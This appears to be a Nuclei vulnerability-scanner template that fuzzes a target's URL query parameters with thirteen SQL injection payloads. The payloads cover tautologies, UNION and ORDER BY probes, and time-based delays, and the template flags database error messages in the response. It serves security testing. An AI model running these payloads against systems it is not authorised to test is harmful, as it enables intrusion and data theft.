id: heavy-sqli-fuzz

info:
  name: Heavy SQLi Fuzzing (Custom List)
  author: ajvad
  severity: critical
  description: Fuzzes all query parameters with a massive list of SQLi payloads.
  tags: sqli,fuzz,dast

http:
  - method: GET
    path:
      - "{{BaseURL}}"

    payloads:
      sqli_payloads:
        - "' OR 1=1 --"
        - "\" OR 1=1 --"
        - "' OR '1'='1"
        - "\" OR \"1\"=\"1"
        - "1' ORDER BY 1--+"
        - "1' ORDER BY 2--+"
        - "1' ORDER BY 3--+"
        - "1 UNION SELECT 1,2,3--+"
        - "@@version"
        - "WAITFOR DELAY '0:0:5'"
        - "BENCHMARK(5000000,MD5(1))"
        - "pg_sleep(5)"
        - "' or sleep(5)#"

    fuzzing:
      - part: query
        type: replace
        mode: single
        fuzz:
          - "{{sqli_payloads}}"

    stop-at-first-match: true
    matchers-condition: or
    matchers:
      - type: word
        part: body
        words:
          - "SQL syntax"
          - "mysql_fetch_array"
          - "ORA-01756"
          - "SQLite/JDBCDriver"
          - "System.Data.SqlClient.SqlException"
          - "Unclosed quotation mark"

